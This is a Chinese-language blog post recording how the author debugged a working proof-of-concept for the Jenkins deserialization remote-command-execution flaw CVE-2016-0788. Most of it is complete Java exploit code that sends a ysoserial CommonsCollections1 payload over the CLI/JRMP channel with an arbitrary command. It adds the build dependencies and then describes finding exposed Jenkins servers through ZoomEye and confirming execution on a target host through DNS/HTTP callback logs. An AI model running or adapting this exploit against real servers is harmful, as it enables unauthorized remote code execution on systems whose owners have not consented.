---
layout: post
title: Jenkins RCE 2(CVE-2016-0788) PoC 调试记录
description: "Poc for Jenkins RCE 2(CVE-2016-0788)"
category: scanner
tags: [scanner, java, Jenkins]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---

### 概要

从去年开始，java安全领域因为反序列化这个问题爆出了大量的远程命令执行漏洞。可以说这一系列漏洞都是非常简单粗暴的，由于java的高权限、兼容通用等特性，攻击者往往会在短时间内使大批量系统中招，而且攻击成本相对较低。看到了乌云drops上分析Jenkins RCE 2(CVE-2016-0788)这个漏洞的文章[^1]，觉得调试起来应该不难，就跟着调通了漏洞的利用Poc。
<!--more-->

[^1]: <http://drops.wooyun.org/papers/17716>

### 漏洞利用

对于目前的开源项目来说，安全漏洞发现后，很多安全研究人员会根据该项目的相关修复代码倒推攻击利用细节。Jenkins这个项目更是比较耿直，直接把很多攻击测试PoC写到了Junit测试样例中[^2]。
<!--more-->

[^2]: <https://github.com/jenkinsci/jenkins/blob/9fce1ee933eb5276baff977d562fc8e183f1c8d6/test/src/test/java/jenkins/security/Security232Test.java>

{% highlight java linenos %}
public class Jenkins {

    public static void main( final String[] args) throws Exception {

        int jrmpPort = 12345;
        URL u = new URL("http://TARGET_URL/");

        HttpURLConnection hc = (HttpURLConnection) u.openConnection();
        int clip = Integer.parseInt(hc.getHeaderField("X-Jenkins-CLI-Port"));

        InetSocketAddress isa = new InetSocketAddress(u.getHost(), clip);
        Socket s = null;
        Channel c = null;
        try {
            System.err.println("* Opening socket " + isa);
            s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            System.err.println("* Opening channel");
            OutputStream outputStream = s.getOutputStream();

            DataOutputStream dos = new DataOutputStream(outputStream);

            dos.writeUTF("Protocol:CLI-connect");

            ExecutorService cp = Executors.newCachedThreadPool();
            c = new ChannelBuilder("EXPLOIT", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);

            System.err.println("* Channel open");

            Class<?> reqClass = Class.forName("hudson.remoting.RemoteInvocationHandler$RPCRequest");

            Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
            reqCons.setAccessible(true);

            Object getJarLoader = reqCons
                    .newInstance(1, Class.forName("hudson.remoting.IChannel").getMethod("getProperty", Object.class), new Object[] {
                            JarLoader.class.getName() + ".ours"
                    });

            Object call = c.call((Callable<Object,Exception>) getJarLoader);
            InvocationHandler remote = Proxy.getInvocationHandler(call);
            Class<?> rih = Class.forName("hudson.remoting.RemoteInvocationHandler");
            Field oidF = rih.getDeclaredField("oid");
            oidF.setAccessible(true);
            int oid = oidF.getInt(remote);

            System.err.println("* JarLoader oid is " + oid);

            Constructor<UnicastRemoteObject> uroC = UnicastRemoteObject.class.getDeclaredConstructor();
            uroC.setAccessible(true);
            ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
            Constructor<?> sc = rf.newConstructorForSerialization(ActivationGroupImpl.class, uroC);
            sc.setAccessible(true);
            UnicastRemoteObject uro = (UnicastRemoteObject) sc.newInstance();

            Field portF = UnicastRemoteObject.class.getDeclaredField("port");
            portF.setAccessible(true);
            portF.set(uro, jrmpPort);
            Field f = RemoteObject.class.getDeclaredField("ref");
            f.setAccessible(true);
            f.set(uro, new UnicastRef2(new LiveRef(new ObjID(2), new TCPEndpoint("localhost", 12345), true)));

            Object o = reqCons
                    .newInstance(oid, JarLoader.class.getMethod("isPresentOnRemote", Class.forName("hudson.remoting.Checksum")), new Object[] {
                            uro,
                    });

            try {
                c.call((Callable<Object,Exception>) o);
            }
            catch ( Exception e ) {
                // [ActivationGroupImpl[UnicastServerRef [liveRef:
                // [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1, -9046794842107247609]]

                e.printStackTrace();

                String msg = e.getMessage();
                int start = msg.indexOf("objID:[");
                if ( start < 0 ) {
                    return; // good, got blocked before we even got this far
                }

                int sep = msg.indexOf(", ", start + 1);

                if ( sep < 0 ) {
                    throw new Exception("Failed to get object id, separator");
                }

                int end = msg.indexOf("]", sep + 1);

                if ( end < 0 ) {
                    throw new Exception("Failed to get object id, separator");
                }

                String uid = msg.substring(start + 7, sep);
                String objNum = msg.substring(sep + 2, end);

                System.err.println("* UID is " + uid);
                System.err.println("* ObjNum is " + objNum);

                String[] parts = uid.split(":");

                long obj = Long.parseLong(objNum);
                int o1 = Integer.parseInt(parts[ 0 ], 16);
                long o2 = Long.parseLong(parts[ 1 ], 16);
                short o3 = Short.parseShort(parts[ 2 ], 16);

                exploit(new InetSocketAddress(isa.getAddress(), jrmpPort), obj, o1, o2, o3, new CommonsCollections1(), "YOUR COMMAND");
            }

            c.close();
        }
        finally {
            if ( s != null ) {
                s.close();
            }
        }

        Thread.sleep(5000);

    }


    /**
     * @param inetSocketAddress
     * @param obj
     * @param o1
     * @param o2
     * @param o3
     * @throws IOException
     */
    private static void exploit ( InetSocketAddress isa, long obj, int o1, long o2, short o3, ObjectPayload payload, String payloadArg )
            throws Exception {
        Socket s = null;
        try {
            System.err.println("* Opening JRMP socket " + isa);
            s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            final ObjectOutputStream objOut = new ObjectOutputStream(dos) {

                protected void annotateClass ( Class<?> cl ) throws IOException {
                    if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                        writeObject(null);
                    }
                    else {
                        URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                        String cb = "";
                        for ( URL u : us ) {
                            cb += u.toString();
                        }
                        writeObject(cb);
                    }
                }
                protected void annotateProxyClass ( Class<?> cl ) throws IOException {
                    annotateClass(cl);
                }
            };

            objOut.writeLong(obj);
            objOut.writeInt(o1);
            objOut.writeLong(o2);
            objOut.writeShort(o3);

            objOut.writeInt(-1);
            objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod("newInstance", ActivationID.class, ActivationDesc.class)));

            System.err.println("Running " + payload + " against " + ClassFilter.class.getProtectionDomain().getCodeSource().getLocation());
            final Object object = payload.getObject(payloadArg);
            objOut.writeObject(object);

            os.flush();
        }
        finally {
            if ( s != null ) {
                s.close();
            }
        }
    }
}

{% endhighlight %}

针对代码的具体分析可以参考乌云drops的那篇文章。接下来，我们需要做的就是解决相关的依赖关系。这个PoC代码需要的依赖分为两类，一类是Jenkins自身的依赖，另外一类是用来构造RCE的payload框架。

Jenkins自身依赖相关的maven配置如下：

{% highlight xml %}
<dependency>
  <groupId>org.jenkins-ci</groupId>
  <artifactId>constant-pool-scanner</artifactId>
  <version>1.2</version>
</dependency>
<dependency>
  <groupId>org.jvnet.hudson.main</groupId>
  <artifactId>hudson-remoting</artifactId>
  <version>2.2.1</version>
</dependency>
{% endhighlight %}

构造RCE的Payload框架是近期出镜率极高的[ysoserial](https://github.com/frohoff/ysoserial), 可以直接下载release的jar包设置为外部依赖。

至此，我们已经完成了PoC的调试准备工作，让我们来测试一下是不是能够触发RCE。

### PoC测试

我们可以通过ZoomEye等搜索引擎获取公网中Jenkins主机信息，特别注意的是Jenkins的这个漏洞需要获取HTTP原始报文中的X-Jenkins-CLI-Port头部来确定利用端口，所以在挑选主机时就需要筛选是否带有这个字段。

![Jenkins HTTP报文](http://7xwdx7.com1.z0.glb.clouddn.com/jenkins-port.png)

最后，我们设置好URL以及我们需要执行的命令、运行PoC，可以看到cloudEye后台已经有了目标主机的access_log。证明该命令已经在远程主机被执行了。

![Jenkins Poc运行情况](http://7xwdx7.com1.z0.glb.clouddn.com/jenkins_poc_run.png)

![Jenkins HTTP报文](http://7xwdx7.com1.z0.glb.clouddn.com/jenkins_cloudeye.png)
